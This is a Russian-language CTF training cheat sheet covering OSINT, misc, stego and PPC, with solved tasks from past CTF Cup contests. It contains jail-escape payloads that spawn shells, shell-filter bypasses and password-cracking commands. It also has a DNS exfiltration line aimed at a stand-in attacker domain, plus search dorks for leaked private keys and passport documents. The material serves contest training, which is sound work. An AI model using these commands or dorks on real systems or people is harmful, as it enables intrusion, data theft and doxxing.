# Misc / OSINT / PPC — рабочая шпаргалка
> X Кубок CTF России 2026, отбор. Читать на тренировке, держать открытой в контесте.
> Сначала выясни, **что дано** и **что просят**, потом выбирай инструмент. 80% misc — внимательность, а не хакинг.
## 1. OSINT: рамка за 60 секунд
1. Выпиши сущности: имя, ник, email, телефон, номер документа, фото, домен, IP, координаты, время.
2. Раздели: **что ищем** (человек, место, организация, аккаунт) и **где это может быть опубликовано**.
3. Ищи в трёх плоскостях: точная строка → вариант написания → локальный язык/транслитерация.
4. Фиксируй шаги: запрос, ссылка, что нашёл. Иначе через 20 минут будешь повторять.
5. Только публичные источники. Не атакуй инфраструктуру и не пиши людям.

### 1.1. Google dorks
| Оператор | Смысл | Пример |
|---|---|---|
| `"..."` | точная фраза | `"Иван Петров" "Москва"` |
| `-` | исключить | `"Иван Петров" -вакансия` |
| `OR` / `|` | альтернатива | `"Ivan Petrov" OR "Иван Петров"` |
| `site:` | только домен | `site:vk.com "Иван Петров"` |
| `inurl:` / `intitle:` | в URL / title | `inurl:profile "ivan"` |
| `filetype:` / `ext:` | тип файла | `filetype:pdf "паспорт"` |
| `before:` / `after:` | даты | `before:2024-01-01` |
| `AROUND(3)` | близость слов | `"Иван" AROUND(3) "Петров"` |
| `*` | wildcard | `"Иван * Петров"` |
| `cache:` / `related:` | кэш / похожие | `related:example.com` |
| `map:` / `imagesize:` | карты / размер | `map:Москва` |

```text
"ФИО" (telegram OR vk OR ok OR instagram)
"ник" (site:github.com OR site:habr.com OR site:reddit.com)
"email" (filetype:pdf OR filetype:docx OR filetype:xlsx)
"номер" (site:gov.ru OR site:docs.google.com OR site:drive.google.com)
site:pastebin.com "example.com"
site:github.com "BEGIN RSA PRIVATE KEY"
```

### 1.2. Яндекс
- Лучше Google по русскоязычным сайтам, соцсетям, картинкам и старым страницам.
- Операторы: `site:`, `title:`, `url:`, `host:`, `mime:`, `lang:`, `date:`, `cat:`, `rpt:`, `family:`.
- `!` — точная форма слова, `+` — обязательное слово. Переключай регион и язык.
- Картинки: загрузи/вставь URL, обрежь лишнее, ищи по фрагменту.

### 1.3. Reverse image search
| Сервис | Когда |
|---|---|
| Google Lens | общие объекты, логотипы, достопримечательности |
| Yandex Images | лица, СНГ, соцсети, старые фото |
| Bing Visual Search | товары, техника |
| TinEye | точные копии, история появления |
| Baidu | китайские источники |
| SauceNAO | аниме/арт |
| PimEyes / Search4Faces | лица (осторожно с этикой) |

Приёмы: обрезать фон, повернуть, отразить, увеличить, убрать водяной знак, поменять контраст; искать по нескольким фрагментам; проверить EXIF до и после соцсети; искать по имени файла.

### 1.4. Геолокация
1. **Страна**: язык вывесок, сторона движения, формат номеров, флаги, валюта, архитектура.
2. **Город**: дорожные знаки, столбы, бордюры, плитка, растительность, рельеф, транспорт.
3. **Точка**: ЛЭП, вышки, мосты, вывески, отражения, тени, километровые столбы.
4. **Проверка**: Google/Yandex Maps, Street View, Mapillary, Wikimapia, PastVu.
5. **Время**: SunCalc по теням, высота солнца, длина дня; weather history.

```text
SunCalc.net / suncalc.org        — азимут и высота солнца
timeanddate.com                  — восход/закат, часовые пояса
Meteostat / Ogimet / rp5.ru      — погода за прошлые даты
Google Earth                     — исторические снимки
Sentinel Hub EO Browser          — свежие спутниковые снимки
NASA FIRMS                       — пожары/тепловые точки
Mapillary / KartaView            — краудсорсинговые панорамы
Overpass Turbo                   — объекты OSM по тегам
what3words / Geohash             — короткие координаты
```

Форматы: `55.7558, 37.6173`; `55°45'20.9"N 37°37'02.3"E`; `geo:55.7558,37.6173`; Geohash `ucfv...`. Не путай широту и долготу.

### 1.5. Метаданные
```bash
exiftool -a -u -g1 -s f.jpg; exiftool -GPS* -time:all -serial* -software f.jpg; exiv2 -pa f.jpg
exiftool -b -ThumbnailImage f.jpg > thumb.jpg; mat2 --show f.jpg
pdfinfo f.pdf; qpdf --qdf --object-streams=disable f.pdf out.pdf; strings -a -n 6 f.pdf | less
unzip -o f.docx -d docx; cat docx/docProps/core.xml docx/docProps/app.xml
```

Смотреть: `GPSLatitude/Longitude`, `DateTimeOriginal`, `Make/Model`, `SerialNumber`, `Software`, `Artist`, `Copyright`, `Comment`, `UserComment`, `XMP`, миниатюру (может отличаться), имя устройства, версию прошивки. PDF: `pdftotext`, `pdfimages -all`, вложенные файлы, JavaScript. Office: `docProps`, `media/`, комментарии, скрытые листы.

### 1.6. Username / email / phone enumeration
```bash
sherlock user --timeout 10; maigret user --html --pdf; whatsmyname user
holehe email@example.com; h8mail -t email@example.com
```

- GitHub: `https://api.github.com/users/USER`, репозитории, commits (email в `git log`), gists, followers.
- Telegram: `https://t.me/USER`, `https://t.me/s/CHANNEL` (веб-превью), `tgstat.ru`, `telemetr.io`; ID — через `@userinfobot`.
- VK: `https://vk.com/USER`, `https://vk.com/id123`, `https://vk.com/foaf.php?id=123`, `https://m.vk.com/USER`; поиск по людям и стенам.
- OK: `https://ok.ru/USER`; Reddit: `/user/USER/about.json`; Steam: `/id/USER`; Discord: ID, серверы, `disboard.org`.
- Email → Gravatar (`https://www.gravatar.com/avatar/HASH?d=404`), GitHub, Have I Been Pwned (только факт утечки).
- Телефон → объявления, WhatsApp/Telegram по номеру, `truecaller` (осторожно).

### 1.7. Архивы и кэш
```text
web.archive.org/web/*/URL
web.archive.org/cdx/search/cdx?url=example.com&output=json&fl=timestamp,original,statuscode&filter=statuscode:200&collapse=digest
archive.ph / archive.today
commoncrawl.org — индекс и WARC
Bing cache / Yandex saved copy
```

```bash
waybackurls example.com | sort -u; gau example.com
```

Старые версии страниц часто содержат удалённые фото, старый email, ФИО, адрес, комментарии, ссылки на соцсети, токены в JS. Ищи также `robots.txt`, `sitemap.xml`, `/.git/`, `/backup/`.

### 1.8. WHOIS, DNS, IP, Shodan/Censys
```bash
whois example.com; dig +short A example.com; dig +short MX example.com; dig +short TXT example.com
dig +short NS example.com; dig AXFR @ns.example.com example.com; dig -x IP
host example.com; nslookup example.com 8.8.8.8
```

- RDAP: `https://rdap.org/domain/example.com`, `https://rdap.org/ip/1.2.3.4`.
- История DNS: SecurityTrails, ViewDNS, DNSDumpster; сертификаты: `https://crt.sh/?q=%25.example.com&output=json`.
- Shodan: `hostname:`, `net:`, `port:`, `http.title:`, `http.html:`, `ssl.cert.subject.CN`, `http.favicon.hash:`.
- Censys: `services.http.response.html_title`, `services.tls.certificates.leaf.subject.common_name`.
- FOFA: `body=`, `cert=`, `icon_hash=`, `domain=`; ZoomEye — аналог для азиатского сегмента.
- Favicon hash: `python3 -c "import mmh3,requests;print(mmh3.hash(requests.get('http://IP/favicon.ico').content))"`.

### 1.9. Telegram и VK
- Telegram: `t.me/USER`; канал `t.me/s/CHANNEL`; сообщение `t.me/CHANNEL/123`.
- Webhook-боты: `https://api.telegram.org/bot<TOKEN>/getWebhookInfo`, `setWebhook`, `getUpdates`.
- Локальный Bot API (`telegram-bot-api`) умеет `file://` — частая уязвимость суперфинала.
- ID администратора часто утекает в логах, HTML-комментариях, конфигах.
- VK: `vk.com/USER`, `vk.com/idN`, `vk.com/foaf.php?id=N` (XML с именем), `vk.com/wallN`, `vk.com/photosN`, `vk.com/friendsN`.
- Поиск людей: `vk.com/search?c[section]=people&c[q]=...`. Старые профили — Wayback и Яндекс.

### 1.10. AADHAAR-кейс (babyosint, 2025)
Дано: «AADHAAR 548550008000», найти имя и фамилию.

1. Искать номер точно, в кавычках, с пробелами и без: `"548550008000"`, `"5485 5000 8000"`.
2. Добавлять контекст: `Aadhaar`, `India`, `card`, `document`, `PDF`.
3. Искать по Google **и** Yandex, по картинкам, `site:habr.com`, `site:docs.google.com`, `site:drive.google.com`.
4. Проверить, не часть ли это публичного примера/статьи/карточки животного.
5. Статья на Habr (358170) в конце содержит карточку собаки с этим номером; имя — Tommy Singh.

Вывод: идентификатор может быть **не человеком**, а примером из документации. Проверяй контекст, а не только совпадение цифр. Формат: `ctfcup{Name_Surname}` — регистр и разделитель важны.
## 2. Misc: быстрый арсенал
### 2.1. QR и штрихкоды
```bash
zbarimg -q --raw qr.png; zbarimg -q --raw *.png; qrencode -t ANSIUTF8 "text"
python3 -c "from pyzbar.pyzbar import decode; from PIL import Image; print(decode(Image.open('qr.png')))"
```

- Типы: QR, Micro QR, DataMatrix, Aztec, PDF417, Code128, EAN-13, ITF.
- Повреждённый QR: бинаризация, инверсия, `warpPerspective`, увеличить, убрать шум; пробуй `zxing` и `zbar` — они ошибаются по-разному.
- QR может быть составным: несколько кодов → склейка; QR в QR; QR на видео → `ffmpeg` кадры.
- Проверь, не спрятан ли QR в metadata/EOF/другом канале.

### 2.2. Архивы
```bash
file archive; binwalk -e archive; 7z l archive; 7z x archive -pPASSWORD
unzip -l archive.zip; zipinfo -v archive.zip; zipnote archive.zip; unzip -P PASSWORD archive.zip
zip2john archive.zip > hash.txt; john hash.txt --wordlist=rockyou.txt
hashcat -m 17200 hash.txt rockyou.txt     # ZipCrypto
hashcat -m 13600 hash.txt rockyou.txt     # WinZip AES
rar2john archive.rar > hash.txt; 7z2john archive.7z > hash.txt
```

- Пароль может лежать в комментарии (`zipnote`), имени файла, metadata, README, истории git.
- ZipCrypto known-plaintext: `bkcrack -C encrypted.zip -c secret.txt -P plain.zip -p secret.txt`, затем `bkcrack -C encrypted.zip -k KEY -U unlocked.zip`.
- Вложенные архивы: `binwalk -e`, `foremost`, рекурсивный скрипт; следи за лимитом глубины.
- Битые заголовки: `7z x` часто чинит; `zip -FF broken.zip --out fixed.zip`; `bzip2 -dc`; `gzip -dc`.
- Пароль может быть в **имени** архива (`matreshka_1000.zip` → пароль внутри предыдущего).

### 2.3. Pyjail
```python
().__class__.__base__.__subclasses__()
[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == "catch_warnings"][0]()._module.__builtins__["__import__"]("os").system("sh")
__import__("os").system("cat /flag")
open("/flag").read()
breakpoint()          # Python 3.7+, затем !import os; os.system("/bin/sh")
help()                # интерактивный help, иногда !sh
license()             # pager, иногда !sh
```

- Нет `[]`: `getattr(().__class__.__base__, "__subclasses__")()`.
- Нет кавычек: `chr(111)+chr(115)`; `bytes([111,115]).decode()`.
- Нет `_`: `getattr` и строки из `chr`.
- Запрещены буквы: f-string, `\x`, `\u`, переменные окружения, `globals()`.
- `eval` без builtins: ищи subclasses, `warnings.catch_warnings`, `os._wrap_close`.
- `audit hook` может логировать, но не всегда блокирует; пробуй `os.system`, `subprocess`, `ctypes`.
- Если дан исходник — ищи фильтр, обойди его, а не гадай.

### 2.4. Bash jail
```bash
cat</flag; $(</flag); echo "$(<flag)"
while read l; do echo "$l"; done < flag
mapfile -t a < flag; echo "${a[@]}"; exec 3<flag; cat <&3
dd if=flag; awk '{print}' flag; sed -n p flag; grep '' flag
od -c flag; xxd flag; base64 flag; tar cf - flag
```

- `cat` запрещён → `/???/??t`, `/*/cat`, `[c]at`, `$'\x63\x61\x74'`, `c'a't`, `rev`.
- Пробел запрещён → `${IFS}`, `$IFS`, `<`, `%09`. Слэш → `$PWD`, `cd ..`, `${HOME:0:1}`.
- `$PATH` → `export PATH=/tmp:$PATH`; подложи `cat`.
- `BASH_ENV`, `ENV`, `PROMPT_COMMAND`, `PS4='$(cat /flag)'`.
- `LESSOPEN='|cat /flag %s' less file`.
- `vi`: `:!cat /flag`, `:r /flag`, `:set shell=/bin/sh`, `:shell`; `less`/`more`: `!cat /flag`, `v`.
- `find / -exec cat /flag \;`, `-exec sh -c 'cat /flag' \;`.
- `awk 'BEGIN{system("cat /flag")}'`; `perl -e 'system("cat /flag")'`; `ruby -e`; `php -r`.
- `tar --checkpoint=1 --checkpoint-action=exec=sh`.
- `git -p help`, `man man`, `nmap --interactive`, `ftp`, `sftp`, `gdb` — pager/shell escapes.

### 2.5. Esolang
| Язык | Признак | Запуск |
|---|---|---|
| Brainfuck | только `+-<>[].,` | `bf file`, `brainfuck file` |
| Ook! | пары `Ook. Ook?` | `ook file` |
| Whitespace | только пробелы/табы/переводы | `whitespace file` |
| Malbolge | странные символы, почти не читается | `malbolge file` |
| Piet | картинка из цветных блоков | `npiet file.png` |
| Befunge | `><^v`, цифры, `"` | `befunge file` |
| JSFuck | только `[]()!+` | Node.js |
| Shakespeare | «Act I, Scene I» | интерпретатор |

```bash
file file.txt; xxd file.txt | head; strings -a file.txt
python3 -c "print(open('file.txt','rb').read()[:200])"
```

Онлайн: `tio.run`, `dcode.fr`, `esolangs.org`. Если код в картинке — ищи палитру и сетку; если в аудио — спектрограмму.

### 2.6. DNS
```bash
dig +short A example.com; dig +short TXT example.com; dig +trace example.com
dig AXFR @ns.example.com example.com; dig -x IP
dnsrecon -d example.com -t std,brt; dnsenum example.com
subfinder -d example.com -silent; amass enum -passive -d example.com
```

- TXT: `_dmarc`, `_acme-challenge`, `google-site-verification`, SPF — инфраструктура и контакты.
- Zone transfer — быстрый способ получить все имена.
- DNS exfil: `nslookup $(cat flag).attacker.com`; на сервере — `tcpdump -i any port 53` или `iodine`/`dnscat2`.
- DNS rebinding для SSRF: домен с коротким TTL, сначала твой IP, потом `127.0.0.1`.
- Wildcard: сравнивай ответ для случайного имени.

### 2.7. Game theory / интерактивные игры
- Определи тип: детерминированная, случайная, с неполной информацией, с эксплойтом протокола.
- Если игра честная — считай **ожидание** и оптимальную стратегию; если «нечестная» — ищи переполнение, отрицательную ставку, гонку, повторное использование seed.
- C `rand()`: seed часто `time(NULL)`; подбери seed по первому числу или перебери 100 вариантов.
- Python `random`: MT19937; при утечке 624 выходов состояние восстанавливается (`randcrack`).
- Nim/игры на кучах: XOR-сумма (Grundy), выигрышная стратегия — оставить XOR = 0.
- Minimax/alpha-beta для маленьких досок; DP по состояниям.
- Смешанная стратегия: равновесие Нэша, считай частоты; не пытайся угадать.
- В CTF часто достаточно **сломать проверку**: `bet > money`, `bet < 0`, `int` overflow, `NaN`, `Infinity`, повторный `submit`.

### 2.8. PPC: интерактивные задачи
```bash
nc HOST PORT; ncat --ssl HOST PORT; socat - TCP:HOST:PORT
```

1. Прочитай условие дважды: сколько раундов, формат ответа, что считается победой.
2. Подключись вручную, посмотри приветствие, единицы, разделители, задержки.
3. Если есть исходник — запусти локально, пройди отладчиком, найди проверку.
4. Посчитай, сколько времени на раунд; если меньше 1 с — нужна оптимизация/батчинг.
5. Сразу напиши парсер и один раунд, потом цикл.

### 2.9. API и JSON
```bash
curl -s -c cookies.txt -b cookies.txt http://HOST/api | jq .
curl -s -X POST http://HOST/api -H 'Content-Type: application/json' -d '{"a":1}' | jq .
curl -s -D - -o /dev/null http://HOST/
```

- Смотри `Set-Cookie`, `Authorization`, CSRF, rate limit, пагинацию, ошибки.
- `jq`: `jq '.items[] | {id,name}'`, `jq -r '.token'`.
- OpenAPI: `/openapi.json`, `/swagger.json`, `/api-docs`; GraphQL: `/graphql`, introspection `{__schema{types{name}}}`.
- JSON-ловушки: `NaN`, `Infinity`, `1e999`, дубли ключей, разный тип (`"1"` vs `1`), Unicode.
- Если API отдаёт float — не парси в `float` без нужды; используй `Decimal`.
## 3. Stego: минимальный набор
```bash
file image.png; exiftool image.png; strings -a -n 6 image.png | less
binwalk -e image.png; foremost -i image.png -o out; pngcheck -v image.png
zsteg -a image.png; stegsolve image.png; steghide extract -sf image.jpg
stegseek image.jpg rockyou.txt; identify -verbose image.png
compare -metric AE original.png modified.png diff.png
```

- PNG: `zsteg -a`, палитра, alpha, LSB, CRC, нестандартные чанки, `tEXt`/`iTXt`, данные после `IEND`.
- JPEG: `steghide`, `outguess`, `jsteg`, `stegseek`, EXIF, thumbnail, маркеры `FFD9`.
- Аудио: спектрограмма (Audacity/Sonic Visualiser), LSB, DTMF (`multimon-ng -a DTMF`), SSTV (`qsstv`), Morse.
- PDF: `pdfimages`, `pdftotext`, `qpdf`, вложенные файлы, JavaScript, метаданные.
- Office: `unzip`, `docProps`, `media/`, скрытые листы, комментарии, макросы.
- Видео: `ffmpeg -i in.mp4 frames/%04d.png`, `ffprobe`, субтитры, аудиодорожки.
- Текст: zero-width (`\u200b`, `\u200c`, `\u200d`, `\ufeff`), пробелы/табы, регистр, первая буква строки, `strings`, `xxd`.
- Git: `git log -p`, `git ls-files`, `git fsck --lost-found`, `.git/objects`.
## 4. PPC: шаблон автоматизации на pwntools
```python
#!/usr/bin/env python3
from pwn import *
import re, sys, time

context.log_level = "info"          # debug — когда непонятно
HOST, PORT = sys.argv[1], int(sys.argv[2])
ROUNDS = 100

def solve_round(io):
    line = io.recvline(timeout=5)
    if not line:
        raise EOFError("no data")
    nums = list(map(int, re.findall(rb"-?\d+", line)))
    io.sendlineafter(b"> ", str(sum(nums)).encode())

def run():
    io = remote(HOST, PORT)
    for i in range(ROUNDS):
        solve_round(io)
    io.interactive()

if __name__ == "__main__":
    run()
```

- `recvuntil(b"x y> ")`, `sendlineafter(b": ", b"42")` — не угадывай приглашение, смотри вручную.
- `io.recvline(timeout=3)`; `io.can_recv()`; `io.clean()`; `context.timeout`.
- Логируй номер раунда и входные данные; при падении сохраняй `io.recvall()`.
- `EOFError` → переподключение; бинарный протокол → `p32/p64`, `struct.unpack`, длина + payload.
- Float: отправляй `repr(x)` или `f"{x:.17g}"`; не `round(x, 2)`.
- Несколько ответов на запрос — батчинг: читай все, отвечай одним пакетом.

### 4.1. Таймауты, retry, переподключение
```python
def with_retry(fn, attempts=5, delay=0.5):
    for i in range(attempts):
        try:
            return fn()
        except (EOFError, PwnlibException, TimeoutError) as e:
            log.warning(f"attempt {i}: {e}")
            time.sleep(delay * (2 ** i))
    raise RuntimeError("all attempts failed")

io = remote(HOST, PORT, timeout=10)
```

- Не ставь `timeout=0.1` «для скорости» — поймаешь ложные таймауты.
- При ретрае создавай **новое** соединение, не пытайся чинить старое.
- Если сервер считает попытки — ретрай может сжечь лимит; сначала отладь локально.
- Длинные задачи: `nohup python3 solve.py > log.txt 2>&1 &`, `tail -f log.txt`.

### 4.2. Многопоточность
```python
from concurrent.futures import ThreadPoolExecutor, as_completed

def one(i):
    io = remote(HOST, PORT, timeout=10)
    ...
    return result

with ThreadPoolExecutor(max_workers=16) as ex:
    futs = [ex.submit(one, i) for i in range(N)]
    for f in as_completed(futs):
        print(f.result())
```

- Один поток — одно соединение; не шарь `io` между потоками.
- `max_workers` 8–32; больше — упрёшься в rate limit и получишь таймауты.
- Если сервер stateful — сначала выясни, можно ли параллелить; иначе только последовательно.
- CPU-задачи — `multiprocessing`, I/O — потоки.

### 4.3. Парсинг и точность
- `re.findall(rb"-?\d+(?:\.\d+)?", data)` — числа; `re` по байтам быстрее.
- `Decimal` для денег/больших дробей; `Fraction` для точных отношений; `mpmath` для высокой точности.
- Не сравнивай float на равенство; допуск `abs(a-b) < 1e-9`.
- Большие целые — Python `int` без переполнения; в C-задачах ищи `int` overflow.
- JSON: `json.loads`; дубли ключей — `object_pairs_hook`; CSV — `csv.reader(delimiter=...)`.
## 5. Разбор задач Кубка
| Задача | Год/этап | Категория | Суть | Техника |
|---|---|---|---|---|
| **babyosint** | 2025, beginners | OSINT | имя по AADHAAR 548550008000 | точный поиск, Habr 358170, карточка собаки, `Tommy_Singh` |
| **babyppc** | 2025, beginners | PPC | 120 раундов, три точки и расстояния | пересечение окружностей → система 2×2, `numpy.linalg.solve`, pwntools |
| **babymisc** | 2025, beginners | Misc | «нечестная игра», ставки | отрицательная ставка → `money -= bet`; `-13371337`; integer overflow |
| **checkpoint** | 2023, ppc | PPC | 100 аудиокапч по 5 секунд, 10 букв NATO | сегментация по тишине, MFCC/Chroma CENS, DTW, cookie после успеха |
| **floating_in_delirium** | 2023, ppc | PPC | XOR с 42 только `+ - * /` | ошибки округления float → bool, `if_n`, таблица 256 значений |
| **slons** | 2023, ppc | PPC/Web | лотерея RSA, ключ в cookie | base64 cookie → PEM, `c > n`, блочная расшифровка `n//8`, 1337 ответов |
| **gamer** | 2023, misc | Misc/Forensics | доска сапёра в дампе | XML `MineSweeperSave-ms`, флажки, цифры под флажками, 20 цифр |
| **math_pong** | 2022, warmup | PPC/Web | магазин флагов, задачи | регистрация, cookie, `eval`, цикл до цены флага, `requests.Session` |
| **classic_matreshka** | 2022, warmup | Misc | 1000 вложенных ZIP с паролями | `zipnote` → пароль, `unzip -P`, рекурсия, автоматизация |

### 5.1. babyppc — геометрия
Даны три точки `a,b,c` и расстояния `da,db,dc` до неизвестной `p`. Пересечение двух окружностей:

```text
2(xb-xa)x + 2(yb-ya)y = da² - db² - xa² + xb² - ya² + yb²
2(xc-xb)x + 2(yc-yb)y = db² - dc² - xb² + xc² - yb² + yc²
```

Реши `2×2` через `numpy.linalg.solve`, отправь `x y`. 120 раундов — цикл и точность `float`.

### 5.2. babymisc — отрицательная ставка
```c
if (bet > money) continue;
money -= bet;
...
money -= bet;   // проигрыш
```

Ставка `-13371337` проходит проверку, `money -= (-13371337)` увеличивает баланс. Дальше ставь `0`, угадывай `0` четыре раза (или просто заверши раунды), баланс ≥ `13371337` → флаг. В C `int` 32-bit: следи за переполнением.

### 5.3. classic_matreshka — вложенные ZIP
```python
import subprocess, re, os
for i in range(1000, 0, -1):
    out = subprocess.run(["zipnote", f"matreshka_{i}.zip"], capture_output=True, text=True).stdout
    pwd = re.findall(r"Password for this zip archive is: ([A-Z0-9]*)", out)[0]
    subprocess.run(["unzip", "-P", pwd, f"matreshka_{i}.zip"])
    os.remove(f"matreshka_{i}.zip")
```

Пароль следующего архива — внутри предыдущего; имя файла подсказывает порядок.
## 6. Чек-лист «10 минут на misc»
- [ ] `file`, `ls -la`, размеры, даты.
- [ ] `strings -a -n 6`, `xxd | head`, `binwalk`.
- [ ] `exiftool` (GPS, serial, software, comment), `pdfinfo`, `unzip -l`.
- [ ] Архивы: `7z l`, `zipinfo`, `zipnote`, пароль в комментарии/имени.
- [ ] Картинки: `pngcheck`, `zsteg -a`, `steghide`, `identify`, `compare`.
- [ ] Аудио: спектрограмма, `multimon-ng`, LSB.
- [ ] Текст: base64/hex/ROT/URL, zero-width, регистр, первая буква.
- [ ] QR/штрихкод: `zbarimg`.
- [ ] Сервис — `nc` вручную, читай приглашение, найди формат.
- [ ] Исходник — запусти локально, найди проверку, обойди.
- [ ] Запиши гипотезы и время; через 10 минут — автоматизируй или отдай напарнику.
## 7. Грабли
1. **Не прочитал условие до конца.** Формат флага, регистр, `ctfcup{}` vs `CTFCup{}`, `_` vs `-`.
2. **Полез в сложное, не проверив простое.** `strings`, `exiftool`, `binwalk`, `zipnote` решают половину misc.
3. **Забыл про вложенность.** Архив в архиве, QR в QR, base64 в base64, PDF в ZIP.
4. **Потерял метаданные.** Соцсеть/мессенджер вырезает EXIF; работай с оригиналом.
5. **Неверный регион поиска.** Яндекс/локальный язык дают то, чего Google не видит.
6. **Слишком точный float.** Отправляй `repr`/17 значащих цифр, принимай допуск.
7. **`recvuntil` не совпал.** Смотри сырые байты, `\r\n`, кодировку, приглашение с пробелом.
8. **Нет таймаута/ретрая.** Один EOF — и скрипт умер на 90-м раунде.
9. **Параллелизм сломал state.** Один поток — одно соединение; проверяй rate limit.
10. **Атака на инфраструктуру.** Сканирование чужих хостов и платформы — дисквалификация.
11. **Не сохранил прогресс.** Логи, cookies, seed, промежуточные файлы — сохраняй.
12. **Не проверил флаг на платформе.** Нашёл — сразу отправь, потом улучшай.
## 8. Ссылки
- `https://gchq.github.io/CyberChef/` — кодировки, архивы, крипто.
- `https://tio.run/`, `https://esolangs.org/`, `https://www.osintframework.com/`.
- `https://crt.sh/`, `https://rdap.org/`, `https://web.archive.org/`.
- `https://suncalc.org/`, `https://www.meteostat.net/`, `https://eos.com/landviewer/`.
- `https://gtfobins.github.io/` — пригодится и в misc.
